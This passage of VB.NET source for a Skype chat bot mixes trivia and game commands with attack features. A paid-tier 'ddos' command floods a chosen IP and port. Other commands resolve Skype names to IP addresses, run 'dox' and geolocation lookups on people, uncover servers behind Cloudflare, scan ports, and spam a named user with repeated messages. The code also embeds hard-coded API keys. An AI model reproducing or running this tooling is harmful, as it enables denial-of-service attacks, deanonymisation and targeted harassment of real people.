            If command = "geo" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "geo <ip>")
            If command.StartsWith("geo ") Then
                Dim geoip As String = command.Replace("geo ", "").Replace(" ", "")
                Dim geomsg As ChatMessage = msg.Chat.SendMessage("Initializing...")
                AddSwagToMSG(geomsg, "Initializing...")
                Dim l As String = geoip
                Dim endmsg As String = ""
                Dim mc As Integer = 0
                If l.Contains(":") Then
                    Dim d() As String = l.Split(":")
                    l = d(0)
                End If
                Dim geotemp As String = ""
                Dim IP As String = ""
                Dim Countrys As String = ""
                Dim location As String = ""
                Dim zipc As String = ""
                Dim reverseddns As String = ""
                Dim latitude As String = ""
                Dim isp As String = ""
                Dim longitude As String = ""
                Dim timezone As String = ""
                Dim skye As String = ""
                If microsoftip(l).ToString.ToLower.Contains("true") Then
                    mc = 1
                Else
                    mc = 0
                End If

                Dim partsa() As String
                Dim w As New WebClient
                w.Proxy = Nothing
                AddSwagToMSG(geomsg, "Checking for skype usernames...")
                If mc = 0 Then
                    Try
                        w.Headers.Add(HttpRequestHeader.Referer, "http://api.c99.nl/cmd/")
                        skye = w.DownloadString("http://api.c99.nl/ip2skype.php?key=skypebotje123&ip=" & l)
                    Catch exy As Exception
                        AddSwagToMSG(geomsg, "Error")
                    End Try
                Else
                    AddSwagToMSG(geomsg, "Error or this is a microsoft IP.")
                End If
                AddSwagToMSG(geomsg, "Getting main info...")
                geotemp = w.DownloadString("http://geoip.maxmind.com/f?l=wnFd0cyKvtLe&i=" & l)
                'BE,12,Londerzeel,,51.000000,4.300000,0,0,"Telenet N.V.","Telenet N.V."
                partsa = geotemp.Split(",")
                isp = partsa(8).Replace("""", "")
                IP = l
                Dim plarts() As String = My.Settings.countrycodes.Split(New String() {Environment.NewLine},
                                               StringSplitOptions.None)
                Dim countryc As String = "Unknown"
                For i = 0 To plarts.Length - 1
                    Dim prats() As String = plarts(i).Split(",")
                    If prats(0) = partsa(0) Then
                        countryc = prats(1).Replace("""", "")
                        Exit For
                    End If
                Next
                Dim regionc As String = "Unknown"
                plarts = My.Settings.regioncodes.Split(New String() {Environment.NewLine},
                                                       StringSplitOptions.None)
                For i = 0 To plarts.Length - 1
                    Dim prats() As String = plarts(i).Split(",")
                    If prats(0) & "," & prats(1) = partsa(0) & "," & partsa(1) Then
                        regionc = prats(2).Replace("""", "")
                        Exit For
                    End If
                Next
                Countrys = partsa(0) & ", " & countryc
                location = regionc & ", " & partsa(2)
                latitude = partsa(4)
                AddSwagToMSG(geomsg, "Getting ReserveDNS info...")
                Try
                    Dim IPHost As IPHostEntry = Dns.GetHostEntry(l)
                    Dim res As String = IPHost.HostName.ToString()
                    If (IPHost.Aliases.Length > 0) Then
                        Dim CurAlias As String
                        Dim nr As Integer = 0
                        For Each CurAlias In IPHost.Aliases
                            nr = nr + 1
                            res = res & vbNewLine & "Nr" & nr & " host: " & CurAlias
                        Next
                    End If
                    reverseddns = res
                Catch exy As Exception
                    reverseddns = "Error"
                End Try
                longitude = partsa(5)
                geotemp = w.DownloadString("http://api.ipinfodb.com/v3/ip-city/?key=d8dc071351f3b1882b26d5b6820df28eaf2528a2746d78ea4fcbfbe5fe52089d&ip=" & l & "&timezone=true")
                partsa = geotemp.Split(";")
                If partsa(0) = "OK" Then
                    zipc = partsa(7)
                    timezone = partsa(10)
                    If latitude.EndsWith("0") Then
                        latitude = latitude.Remove(latitude.Length - 1)
                    End If
                    If latitude.EndsWith("0") Then
                        latitude = latitude.Remove(latitude.Length - 1)
                    End If
                    If latitude.EndsWith("0") Then
                        latitude = latitude.Remove(latitude.Length - 1)
                    End If
                    If latitude.EndsWith("0") Then
                        latitude = latitude.Remove(latitude.Length - 1)
                    End If
                    If latitude.EndsWith("0") Then
                        latitude = latitude.Remove(latitude.Length - 1)
                    End If
                    If latitude.EndsWith("0") Then
                        latitude = latitude.Remove(latitude.Length - 1)
                    End If
                    If latitude.EndsWith("0") Then
                        latitude = latitude.Remove(latitude.Length - 1)
                    End If
                    If latitude.EndsWith("0") Then
                        latitude = latitude.Remove(latitude.Length - 1)
                    End If
                    If latitude.EndsWith("0") Then
                        latitude = latitude.Remove(latitude.Length - 1)
                    End If
                    If latitude.EndsWith("0") Then
                        latitude = latitude.Remove(latitude.Length - 1)
                    End If

                    If longitude.EndsWith("0") Then
                        longitude = longitude.Remove(longitude.Length - 1)
                    End If
                    If longitude.EndsWith("0") Then
                        longitude = longitude.Remove(longitude.Length - 1)
                    End If
                    If longitude.EndsWith("0") Then
                        longitude = longitude.Remove(longitude.Length - 1)
                    End If
                    If longitude.EndsWith("0") Then
                        longitude = longitude.Remove(longitude.Length - 1)
                    End If
                    If longitude.EndsWith("0") Then
                        longitude = longitude.Remove(longitude.Length - 1)
                    End If
                    If longitude.EndsWith("0") Then
                        longitude = longitude.Remove(longitude.Length - 1)
                    End If
                    If longitude.EndsWith("0") Then
                        longitude = longitude.Remove(longitude.Length - 1)
                    End If
                    If longitude.EndsWith(".") Then
                        longitude = longitude.Remove(longitude.Length - 1)
                    End If
                    If latitude.EndsWith(".") Then
                        longitude = longitude.Remove(longitude.Length - 1)
                    End If
                    endmsg = "IP: " & l & vbNewLine & "Location: " & Countrys & ", " & location & vbNewLine & "Coordinates: " & "LA: " & latitude & " LO: " & longitude & vbNewLine & "Timezone: " & timezone & vbNewLine & "Skype Name: " & skye & vbNewLine & "ISP: " & isp & vbNewLine & "DNS: " & reverseddns & vbNewLine & "Google Maps: " & "https://maps.google.com/?ll=" & latitude & "," & longitude
                Else
                    endmsg = "ERROR: Invalid IP"
                End If
En:
                'geomsg.Body = endmsg
                AddSwagToMSG(geomsg, endmsg)
                Exit Sub
            End If
            'GEO END
            'PORTOPEN START
            If command = "portopen" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "portopen <ip> <port>")
            If command.StartsWith("portopen ") Then
                Dim portopen As ChatMessage = msg.Chat.SendMessage("Checking the port...")
                Dim info() As String = command.Replace("portopen ", "").Split(" ")
                Dim ip As String = info(0)
                Dim port As String = info(1)
                If isportopen(ip, port) = True Then
                    portopen.Body = "Port on " & ip & ":" & port & " is open!"
                Else
                    portopen.Body = "Port on " & ip & ":" & port & " is closed!"
                End If
            End If
            'PORTOPEN END
            'GAME START
            If command = "game" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "game <help/parameters>")
            If command.StartsWith("game ") Then
                Dim game As ChatMessage = msg.Chat.SendMessage("Gaming...")
                Dim cmd As String = command.Replace("game ", "")
                If cmd = "help" Then
                    game.Body = (My.Settings.gamehelp)
                    Exit Sub
                End If
                If cmd = "tut" Then
                    game.Body = (My.Settings.gametut)
                    Exit Sub
                End If
                My.Settings.gamedat = My.Settings.gamedat.Replace(";;", ";")
                Dim all As String = My.Settings.gamedat
                Dim alls() As String = all.Split(";")
                Dim guessess As String
                Dim sender As String
                Dim numbertoguess As Integer
                For i = 0 To alls.Length - 2
                    all = alls(i)
                    Dim allarray() As String = all.Split("|")
                    sender = allarray(0)
                    numbertoguess = allarray(1)
                    guessess = allarray(2).Replace(";", "")
                    If sender = msg.Sender.Handle Then
                        GoTo exitt
                    End If
                Next
                sender = "énotfound" 'é can't contain a skype username
exitt:
                If cmd = "gen" Then
                    Randomize()

                    If sender = "énotfound" Then
                        My.Settings.gamedat = My.Settings.gamedat & msg.Sender.Handle & "|" & CInt(Math.Ceiling(Rnd() * 10000)) & "|0;"
                        My.Settings.gamedat = My.Settings.gamedat.Replace(";;", ";")
                    Else
                        Dim result As String = Regex.Match(My.Settings.gamedat, msg.Sender.Handle & "\|([0-9]+)\|([0-9]+);", RegexOptions.IgnoreCase).Value
                        My.Settings.gamedat = My.Settings.gamedat.Replace(result, msg.Sender.Handle & "|" & CInt(Math.Ceiling(Rnd() * 10000)) & "|0;")
                        My.Settings.gamedat = My.Settings.gamedat.Replace(";;", ";")
                    End If
                    AddSwagToMSG(game, "New game generated! Try a number!")
                    Exit Sub
                End If
                Randomize()
                If cmd.StartsWith("gen ") Then
                    Randomize()
                    Dim nr As Integer = cmd.Replace("gen ", "")
                    If sender = "énotfound" Then
                        My.Settings.gamedat = My.Settings.gamedat & msg.Sender.Handle & "|" & CInt(Math.Ceiling(Rnd() * nr)) & "|0;"
                        My.Settings.gamedat = My.Settings.gamedat.Replace(";;", ";")
                    Else
                        Dim result As String = Regex.Match(My.Settings.gamedat, msg.Sender.Handle & "\|([0-9]+)\|([0-9]+);", RegexOptions.IgnoreCase).Value
                        My.Settings.gamedat = My.Settings.gamedat.Replace(result, msg.Sender.Handle & "|" & CInt(Math.Ceiling(Rnd() * nr)) & "|0;")
                        My.Settings.gamedat = My.Settings.gamedat.Replace(";;", ";")
                    End If
                    AddSwagToMSG(game, "New game generated! Try a number!")
                    Exit Sub
                End If
                My.Settings.gamedat = My.Settings.gamedat.Replace(";;", ";")
                If cmd.StartsWith("try ") Then
                    If sender = "énotfound" Then
                        AddSwagToMSG(game, "Generate a game first!")
                        Exit Sub
                    End If
                    Dim result As String = Regex.Match(My.Settings.gamedat, msg.Sender.Handle & "\|([0-9]+)\|([0-9]+);", RegexOptions.IgnoreCase).Value
                    Dim allarray() As String = result.Split("|")
                    numbertoguess = allarray(1)
                    guessess = allarray(2).Replace(";", "")
                    If cmd.Replace("try ", "") = "cheatcode" Then
                        AddSwagToMSG(game, "Psst, the number is " & numbertoguess & "!")
                        Exit Sub
                    End If
                    If cmd.Replace("try ", "") = numbertoguess Then
                        AddSwagToMSG(game, "---- WINNER ----" & vbNewLine & "It took you " & guessess.Replace(";", "") + 1 & " guesses to guess " & numbertoguess & vbNewLine & "You can now generate a new game!" & vbNewLine & "---- WINNER ----")
                    ElseIf Convert.ToDecimal(cmd.Replace("try ", "")) < Convert.ToDecimal(numbertoguess) Then
                        AddSwagToMSG(game, "Higher!")
                    ElseIf Convert.ToDecimal(cmd.Replace("try ", "")) > Convert.ToDecimal(numbertoguess) Then
                        AddSwagToMSG(game, "Lower!")
                    End If
                    My.Settings.gamedat = My.Settings.gamedat.Replace(msg.Sender.Handle & "|" & numbertoguess & "|" & guessess, msg.Sender.Handle & "|" & numbertoguess & "|" & guessess.Replace(";", "") + 1 & ";")
                    Exit Sub
                End If
                AddSwagToMSG(game, "Invalid game command!")
            End If
            'GAME END
            'DDOS START
            If command = "ddos" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "ddos <ip> <port> <time>")
            If command.StartsWith("ddos ") Then
                Dim dds As ChatMessage = msg.Chat.SendMessage("Initializing...")
                Dim cmd As String = command.Replace("ddos ", "")
                AddSwagToMSG(dds, "Starting ddos...")
                Dim splittr As String() = cmd.Split(" ")
                If splittr(0).Contains(".") Then
                Else
                    AddSwagToMSG(dds, "Invalid IP!")
                    Exit Sub
                End If
                Dim ip As String
                Dim tme As Integer
                Dim port As Integer
                Try
                    ip = splittr(0)
                    port = splittr(1)
                    tme = splittr(2)
                Catch
                    AddSwagToMSG(dds, "Invalid IP/Port Or Time + Recheck your syntax (!help ddos)")
                    Exit Sub
                End Try
                If IsNumeric(tme) Then
                    If tme > 600 And IsUltimate(msg.Sender.Handle) Then
                        AddSwagToMSG(dds, "Maximum time is 600s")
                        Exit Sub
                    ElseIf tme > 300 And IsPremium(msg.Sender.Handle) Then
                        AddSwagToMSG(dds, "Maximum time is 300s")
                        Exit Sub
                    ElseIf IsNormalUser(msg.Sender.Handle) Then
                        AddSwagToMSG(dds, "Non upgraded users are not able to use this, see !buy or contact the owner.")
                        Exit Sub
                    End If
                Else
                    AddSwagToMSG(dds, "Invalid Time!")
                    Exit Sub
                End If
                If IsNumeric(port) Then
                    If port > 1 And port < 65535 Then
                    Else
                        AddSwagToMSG(dds, "Port falls out of range 1-65535")
                        Exit Sub
                    End If
                Else
                    AddSwagToMSG(dds, "Invalid Port!")
                    Exit Sub
                End If
                AddSwagToMSG(dds, "Request for attack sent/sending! (No feedback received yet)...")

                Dim res As String = ddos(ip, port, tme)
                AddSwagToMSG(dds, "Received a 200 response code. Let's hope it works! (We currently have no way to check if the attack has been sent successful)")
            End If
            'DDOS END
            'SIDGRAB START
            If command = "sidgrab" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "sidgrab <steamuri/steamnr>")
            If command.StartsWith("sidgrab ") Then
                Dim grab As ChatMessage = msg.Chat.SendMessage("Grabbing steam ID...")
                Dim cmd As String = command.Replace("sidgrab ", "")
                Dim w As New WebClient
                w.Proxy = Nothing
                Dim res As String = w.DownloadString("http://tatakai.net46.net/api/api.php?id=" & cmd)
                Dim partz() As String = res.Split("|")
                AddSwagToMSG(grab, "User: " & partz(0) & vbNewLine & "Games: " & partz(1) & vbNewLine & "SteamID: " & partz(2))
            End If
            'SIDGRAB END
            'DEADFLY START
            If command = "deadfly" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "deadfly <adflyuri>")
            If command.StartsWith("deadfly ") Then
                Dim dead As ChatMessage = msg.Chat.SendMessage("De adflying...")
                Dim cmd As String = command.Replace("deadfly ", "")
                If cmd.StartsWith("http") Or cmd.StartsWith("www.") Then
                    Dim w As New WebClient
                    w.Headers.Add(HttpRequestHeader.Referer, "http://api.c99.nl/cmd/")
                    w.Proxy = Nothing
                    Dim res As String = w.DownloadString("http://api.c99.nl/deadfly.php?key=skypebotje123&url=" & cmd)
                    AddSwagToMSG(dead, "We killed the fly! Here the link: " & res)
                Else
                    AddSwagToMSG(dead, "Invalid url...")
                End If
            End If
            'DEADFLY END
            'RESOLVE START
            If command = "resolve" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "resolve <skypename>")
            If command.StartsWith("resolve ") Then
                Dim resolvesk As String = command.Replace("resolve ", "")
                If resolvesk.Contains(Skypattach.CurrentUserHandle) Then
                    msg.Chat.SendMessage("Nope! Not me!")
                    Exit Sub
                End If
                Dim resolver As ChatMessage = msg.Chat.SendMessage("Resolving...")
                Dim usernametoresolve As String = resolvesk.Replace(" ", "")
                If usernametoresolve = "jeteroll83" Then usernametoresolve = msg.Sender.Handle
                If My.Settings.whitelist.ToLower.Contains(usernametoresolve.ToLower) Then
                    resolver.Body = "This user has been whitelisted!"
                    Exit Sub
                End If
                Dim w As New WebClient
                Dim endresult As String = ""
                Dim rez As String = ""

                resolver.Body = "Resolver 1: " & "Resolving..." & vbNewLine & "Resolver 2: " & "Resolving..." & vbNewLine & "Resolver 3: " & "Resolving..." & vbNewLine & "Cached IPs: " & "Resolving..." & vbNewLine & "Cached IPs 2: " & "Resolving..."
                endresult = Resolve1(usernametoresolve)

                If IsIpValid(endresult) Or endresult = "error" Then  Else endresult = "IP not found!"
                If My.Settings.whitelist.Contains(endresult) Then
                    endresult = "IP has been whitelisted!"
                End If

                If endresult = "error" Then endresult = "Failed!"

                rez = "Resolver 1: " & endresult & vbNewLine & "Resolver 2: "
                resolver.Body = rez & "Resolving..." & vbNewLine & "Resolver 3: " & "Resolving..." & vbNewLine & "Cached IPs: " & "Resolving..." & vbNewLine & "Cached IPs 2: " & "Resolving..."
                endresult = Resolve2(usernametoresolve)

                If IsIpValid(endresult) Or endresult = "error" Then  Else endresult = "IP not found!"
                If My.Settings.whitelist.Contains(endresult) Then
                    endresult = "IP has been whitelisted!"
                End If

                If endresult = "error" Then endresult = "Failed!"

                rez = rez & endresult & vbNewLine & "Resolver 3: "
                resolver.Body = rez & "Resolving..." & vbNewLine & "Cached IPs: " & "Resolving..." & vbNewLine & "Cached IPs 2: " & "Resolving..."
                endresult = Resolve3(usernametoresolve)

                If IsIpValid(endresult) Then  Else endresult = "IP not found!"
                If My.Settings.whitelist.Contains(endresult) Then
                    endresult = "IP has been whitelisted!"
                End If

                rez = rez & endresult & vbNewLine & "Cached IPs: "
                resolver.Body = rez & "Resolving..." & vbNewLine & "Cached IPs 2: " & "Resolving..."
                endresult = Cached(usernametoresolve)

                If My.Settings.whitelist.Contains(endresult) Then
                    endresult = "IP has been whitelisted!"
                End If

                If endresult = "error" Then endresult = "Failed!"
                resolver.Body = rez & endresult

                rez = rez & endresult & vbNewLine & "Cached IPs 2: "
                resolver.Body = rez & "Resolving..."
                endresult = Cached2(usernametoresolve)

                If My.Settings.whitelist.Contains(endresult) Then
                    endresult = "IP has been whitelisted!"
                End If

                If endresult = "Athena Found No Results!" Then endresult = "Failed!"
                resolver.Body = rez & endresult
                Exit Sub
            End If
            'RESOLVE END
            'DICT START
            If command = "dict" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "dict <word>")
            If command.StartsWith("dict ") Then
                Dim api As String = "http://skypebot.ga/apis/apis/dict.php"

                Dim dict As ChatMessage = msg.Chat.SendMessage("Initializing...")

                AddSwagToMSG(dict, POST(api, "auth=sb&def=" & command.Remove(0, 5)))
            End If
            'DICT END
            'DOX START
            If command = "dox" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "dox <name>")
            If command.StartsWith("dox ") Then
                Dim api As String = "http://skypebot.ga/apis/apis/dox.php"

                Dim dox As ChatMessage = msg.Chat.SendMessage("Initializing...")

                AddSwagToMSG(dox, paste(POST(api, "auth=sb&u=" & command.Remove(0, 4))))
            End If
            'DOX END
            'DON START
            If command = "don" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "don <website>")
            If command.StartsWith("don ") Then
                Dim site = command.Replace("don ", "").Replace(" ", "")
                Dim don As ChatMessage = msg.Chat.SendMessage("Initializing...")
                If Not site.Contains(".") Then
                    AddSwagToMSG(don, "Invalid Site")
                    Exit Sub
                End If
                Dim w As New WebClient
                w.Proxy = Nothing
                Dim res As String = w.DownloadString("http://www.isup.me/" & site)
                If res.Contains("is up") Then res = "Online." Else If res.ToLower.Contains("down") Then res = "Offline."
                AddSwagToMSG(don, res)
                Exit Sub
            End If
            'DON END
            'CF RESOLVE START
            If command = "cfresolve" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "cfresolve <website>")
            If command.StartsWith("cfresolve ") Then
                Dim l As ChatMessage = msg.Chat.SendMessage("Trying to resolve...")
                Dim w As New WebClient
                l.Body = w.DownloadString("http://api.predator.wtf/cfresolve/?arguments=" & command.Replace("cfresolve ", "")).Replace("<br>", vbNewLine)
                Exit Sub
            End If
            'CF RESOLVE END
            'REVERSE START
            If command = "reverse" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "reverse <text/string/sentence>")
            If command.StartsWith("reverse ") Then
                Dim reverse As ChatMessage = msg.Chat.SendMessage("Reversing...")
                AddSwagToMSG(reverse, (StrReverse(command.Replace("reverse ", "") & " ").Replace("!", "").Replace("/", "")))
            End If
            'REVERSE END
            'DOMAIN START
            If command = "domain" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "domain <website>")
            If command.StartsWith("domain ") Then
                Dim l As ChatMessage = msg.Chat.SendMessage("Initializing...")
                Try
                    Dim strHostName As String
                    strHostName = Dns.GetHostName()
                    AddSwagToMSG(l, Dns.GetHostByName(command.Replace("domain ", "")).AddressList(0).ToString())
                Catch exe As Exception
                    If exe.ToString.ToLower.Contains("no such host is known") Then
                        AddSwagToMSG(l, "Invalid host.")
                    End If
                End Try
                Exit Sub
            End If
            'DOMAIN END
            'SPAM START
            If command = "spam" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "spam <times> <msg>")
            If command.StartsWith("spam ") Then
                Dim spammer = New Threading.Thread(Sub() spam(msg))
                spammer.Start()
                Exit Sub
            End If
            'SPAM END
            'TSPAM START
            If command = "ts" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "ts <name> <times> <msg>")
            If command.StartsWith("ts ") Then
                Dim mesg As ChatMessage = msg.Chat.SendMessage("Initializing...")
                Dim cmd As String = command.Replace("ts ", "")
                Dim d() As String = cmd.Split(" ")
                Try
                    Dim l As String = d(0)
                    l = d(1)
                    l = d(2)
                Catch exs As Exception
                    AddSwagToMSG(mesg, "Please recheck your syntax (!help ts)")
                End Try
                Dim tosend As String = d(2)
                If IsNumeric(d(1)) = True Then
                    If IsAdmin(msg.Sender.Handle) Then
                    ElseIf d(1) > 50 And IsUltimate(msg.Sender.Handle) Then
                        d(1) = 50
                    ElseIf d(1) > 25 And IsPremium(msg.Sender.Handle) Then
                        d(1) = 25
                    ElseIf d(1) > 10 And IsNormalUser(msg.Sender.Handle) Then
                        d(1) = 10
                    End If
                Else
                    AddSwagToMSG(mesg, "ERROR: You entered an invalid number, try to swap the number and msg!")
                    Exit Sub
                End If
                d(0) = d(0).Replace(" ", "")
                If d(0).Contains(Skypattach.CurrentUserHandle) Then
                    AddSwagToMSG(mesg, "Nope! Not me!")
                    Exit Sub
                End If
                For a = 3 To d.Length - 1
                    tosend = tosend & " " & d(a)
                Next
                AddSwagToMSG(mesg, "Sending the msg....")
                For qq = 1 To d(1) - 0
                    mesg.Body = "Sended MSG " & qq & "/" & d(1) & "."
                    Skypattach.SendMessage(d(0), tosend.Replace("/", "").Replace("!", ""))
                Next
                Skypattach.SendMessage(d(0), "Someone anonymouse made me do that! You can do it too: !ts <skypename> <times> <msg>")
                AddSwagToMSG(mesg, "He succesfully received the attack!")
                Exit Sub
            End If
            'TSPAM END
            'RDNS START
            If command = "rdns" Then msg.Chat.SendMessage("Right syntax: " & trigger & "rdns <ip>")
            If command.StartsWith("rdns ") Then
                Dim rdns As ChatMessage = msg.Chat.SendMessage("Reversing DNS...")
                Dim IPHost As IPHostEntry = Dns.GetHostEntry(command.Replace("rdns ", ""))
                Dim res As String = "The Primary Host name is: " + IPHost.HostName.ToString()
                rdns.Body = res
                If (IPHost.Aliases.Length > 0) Then
                    rdns.Body = (res & vbNewLine & vbNewLine & "Searching for aliases...")
                    rdns.Body = res & vbNewLine & vbNewLine & ("Additional names found are: ")
                    Dim CurAlias As String

                    For Each CurAlias In IPHost.Aliases
                        rdns.Body = rdns.Body & vbNewLine & (CurAlias)
                    Next
                End If
            End If
            'RDNS END
            'LEET START
            If command = "leet" Then msg.Chat.SendMessage("Right syntax: " & trigger & "leet <1-100 degree (more = more leet)> <msg>")
            If command.StartsWith("leet ") Then
                Dim leetz As ChatMessage = msg.Chat.SendMessage("...")
                Dim partz() As String = command.Replace("leet ", "").Replace("!", "").Replace("/", "").Split(" ")
                Dim degree As String = partz(0)
                Dim mesg As String = partz(1)
                For i = 2 To partz.Length - 1
                    mesg = mesg & " " & partz(i)
                Next
                AddSwagToMSG(leetz, Leet.Translate(mesg, degree))
                Exit Sub
            End If
            'LEET END
            'SAY START
            If command = "say" Then msg.Chat.SendMessage("Right syntax: " & trigger & "say <msg>")
            If command.StartsWith("say ") Then
                Dim say As ChatMessage = msg.Chat.SendMessage("...")
                AddSwagToMSG(say, command.Replace("say ", "").Replace("!", "").Replace("/", ""))
                Exit Sub
            End If
            'SAY END
            'HI START
            If command = "hi" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "hi <skype name>")
            If command.StartsWith("hi ") Then
                Dim cmd As String = command.Replace("hi ", "")
                Dim hi As ChatMessage = msg.Chat.SendMessage("Saying hi...")
                If cmd.Contains(Skypattach.CurrentUserHandle) Then
                    msg.Chat.SendMessage("Well, Hi " & Skypattach.User(msg.Sender.Handle).FullName & "!")
                    Exit Sub
                End If
                AddSwagToMSG(hi, "Okay, I'll say " & cmd & " hi from us!")
                Skypattach.SendMessage(cmd, "Hi from me and " & Skypattach.User(msg.Sender.Handle).FullName)
            End If
            'HI END
            'VPNCHECK START
            If command = "vpncheck" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "vpncheck <ip>")
            If command.StartsWith("vpncheck ") Then
                Dim msgr As ChatMessage = msg.Chat.SendMessage("Initializing...")
                msgr.Body = "Initializing..."
                Dim cmd As String = msg.Body.Replace("vpncheck ", "")
                cmd = cmd.Replace("!", "")
                If cmd.Contains(":") Then
                    Dim partsa() As String = cmd.Split(" ")
                    cmd = partsa(0)
                    If cmd = "" Or cmd = " " Or cmd = String.Empty Then
                        cmd = partsa(1)
                    End If
                End If
                If cmd = "" Or cmd = " " Or cmd = String.Empty Then
                    AddSwagToMSG(msg, ("Invalid IP/Syntax, make sure you didn't enter useless spaces."))
                    Exit Sub
                End If
                Dim w As New WebClient
                w.Proxy = Nothing
                Dim ww As New WebClient
                ww.Proxy = Nothing
                AddSwagToMSG(msgr, "Checking for proxy...")
                Dim lolyo As String = proxycheck(cmd)
                If lolyo = True Then AddSwagToMSG(msgr, "Proxy Detected") Else AddSwagToMSG(msgr, "Proxy Not Detected")
            End If
            'VPNCHECK END
            'PASTE START
            If command = "paste" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "paste <text>")
            If command.StartsWith("paste ") Then
                Dim pste As ChatMessage = msg.Chat.SendMessage("Initializing...")
                AddSwagToMSG(pste, paste(command.Replace("paste ", "")))
            End If
            'PASTE END
            'SCAN START
            If command = "scan" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "scan <ip>")
            If command.StartsWith("scan ") Then
                Dim l As ChatMessage = msg.Chat.SendMessage("Initializing...")
                AddSwagToMSG(l, "Open Ports:" & vbNewLine & portscan(command.Replace("!", "").Replace("scan ", "")))
            End If
            'SCAN END
            'NUMBER START
            If command = "number" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "number <integer>")
            If command.StartsWith("number ") Then
                Dim numb As String = command.Replace("number ", "")
                Dim l As ChatMessage = msg.Chat.SendMessage("Initializing...")
                Dim w As New WebClient
                w.Proxy = Nothing
                Try

                    Dim resp As String = w.DownloadString("http://numbersapi.com/" & numb)
                    AddSwagToMSG(l, resp)
                    If resp.Contains("is an unremarkable number.") Then AddSwagToMSG(l, "Number not in database, Sorry!")
                Catch ex As Exception
                    AddSwagToMSG(l, "Invalid number!")
                End Try
            End If
            'NUMBER END
            'YEAR START
            If command = "year" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "year <integer>")
            If command.StartsWith("year ") Then
                Dim numb As String = command.Replace("year ", "")
                Dim l As ChatMessage = msg.Chat.SendMessage("Initializing...")
                Dim w As New WebClient
                w.Proxy = Nothing
                Try
                    Dim resp As String = w.DownloadString("http://numbersapi.com/" & numb & "/year")
                    AddSwagToMSG(l, resp)
                    If resp.Contains("is an unremarkable number.") Then AddSwagToMSG(l, "Number not in database, Sorry!")
                Catch ex As Exception
                    AddSwagToMSG(l, "Invalid number!")
                End Try
            End If
            'YEAR END
            'FACT START
            If command = "fact" Then
                Dim l As ChatMessage = msg.Chat.SendMessage("Finding a nice fact...")
                Dim w As New WebClient
                w.Proxy = Nothing
                AddSwagToMSG(l, w.DownloadString("http://apis.skypebot.ga/apis/Random_Fact.php?auth=True").Replace("<br>", "").Replace("<i>", "").Replace("<head/>", ""))
            End If
            'FACT END
            'JOKE START
            If command = "joke" Then
                Dim l As ChatMessage = msg.Chat.SendMessage("Finding a funny joke...")
                Dim w As New WebClient
                w.Proxy = Nothing
                AddSwagToMSG(l, w.DownloadString("http://apis.skypebot.ga/apis/Random_funny_jokes.php?auth=True").Replace(My.Settings.joketemp, "").Replace("<br>", "").Replace("<head/>", ""))
            End If
            'JOKE STOP
            'QUOTE START
            If command = "quote" Then
                Dim l As ChatMessage = msg.Chat.SendMessage("Finding a famous quote...")
                Dim w As New WebClient
                AddSwagToMSG(l, w.DownloadString("http://apis.skypebot.ga/apis/Famous_Quotes.php?auth=True").Replace("<i>", "").Replace("<br>", "").Replace("<head/>", ""))
            End If
            'QUOTE STOP
            'UNSHORTEN START
            If command = "unshorten" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "unshorten <url>")
            If command.StartsWith("unshorten ") Then
                Dim numb As String = command.Replace("unshorten ", "")
                Dim l As ChatMessage = msg.Chat.SendMessage("Initializing...")
                Dim resp As String = DL("http://api.unshort.tk/?u=" & numb)
                If resp = "[]" Then
                    AddSwagToMSG(l, "Invalid URI, please recheck!")
                    Exit Sub
                End If
                resp = resp.Replace("\/", "/").Replace(numb, "").Replace("}", "").Replace(My.Settings.prf, "").Replace(" ", "%20")
                resp = resp.Substring(0, resp.Length - 1)
                If resp = "" Then
                    AddSwagToMSG(l, "Not unshortenable!")
                    Exit Sub
                End If
                AddSwagToMSG(l, resp)
            End If
            'UNSHORTEN END
            'JOIN START
            If command = "join" Then
                msg.Chat.SendMessage("Click here:" & vbNewLine & My.Settings.cht)
            End If
            'JOIN END
            'YT2MPM3 START
            If command = "yt2mp3" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "yt2mp3 <url>")
            If command.StartsWith("yt2mp3 ") Then
                Dim numb As String = command.Replace("yt2mp3 ", "")
                Dim client As New WebClient
                client.Proxy = Nothing
                Dim l As ChatMessage = msg.Chat.SendMessage("Initializing...")
                Dim url As String = "http://youtubeinmp3.com/fetch/?video=" & numb
                If numb.Contains("watch?v=") And numb.Contains("http") Then
                    AddSwagToMSG(l, "Direct download: " & shorten(url))
                Else
                    AddSwagToMSG(l, "Invalid link")
                    Exit Sub
                End If
            End If
            'YT2MPM3 END

            'WEATHER START
            If command = "weather" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "weather <city/country>")
            If command.StartsWith("weather ") Then
                Dim location = command.Replace("weather ", "").Replace(" ", "")
                Dim weather As ChatMessage = msg.Chat.SendMessage("Initializing...")
                Dim w As New WebClient
                w.Proxy = Nothing
                Dim res As String = w.DownloadString("http://api.predator.wtf/weather/?arguments=" & location)
                'Dim linearr() As String
                res = res.Replace("<br>", vbNewLine)
                AddSwagToMSG(weather, res)
                Exit Sub
            End If
            'WEATHER END

            'DARKNESS START
            If command = "darkness" Then
                Dim darkness1 As ChatMessage = msg.Chat.SendMessage("Hello darkness, my old friend")
                Threading.Thread.Sleep(1000)
                Dim darkness2 As ChatMessage = msg.Chat.SendMessage("I've come to sleep with you again")
                Threading.Thread.Sleep(1000)
                Dim darkness3 As ChatMessage = msg.Chat.SendMessage("Because a vision softly creeping")
                Threading.Thread.Sleep(1000)
